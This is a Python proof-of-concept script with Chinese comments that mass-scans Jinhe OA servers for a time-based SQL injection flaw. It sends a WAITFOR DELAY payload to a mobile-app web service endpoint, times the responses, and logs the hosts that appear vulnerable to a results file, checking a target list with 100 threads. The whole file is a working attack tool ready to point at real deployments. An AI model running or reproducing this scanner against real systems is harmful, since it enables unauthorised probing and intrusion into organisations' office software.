#导包
import requests,argparse,re,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#指纹模块
import argparse,sys,re,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    pass
    
#poc检测模块
def poc(target):
    url = target + "/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3b+WAITFOR%20DELAY%20%270:0:5%27-- "
    # print(url)
    headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Connection": "close",
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=8,proxies=proxies)
        res2= res.elapsed.total_seconds()
        if res2 >5 and res2 <6 :
                   with open(r'./results.txt','a+') as f1:
                        f1.write(f'{target}\n')
                        print('[+]'+target+'存在sql注入漏洞')
        else:
             print('[-]不存在sql注入漏洞')
    except:
         print(f'[*]{target}'+'可能存在访问问题，请手工测试')
         return False

#主函数检测
def main():
    banner()
    parser = argparse.ArgumentParser(description="金和oa延时注入SQL注入漏洞")
    #-u 单个检测 -f 多行检测
    parser.add_argument('-u','--url',dest='url',help="input attack url",type=str)
    parser.add_argument('-f','--flie',dest='file',help="005.txt",type=str)
    args=parser.parse_args()
    if  args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
#主函数的入口
if __name__ =='__main__':
    main()
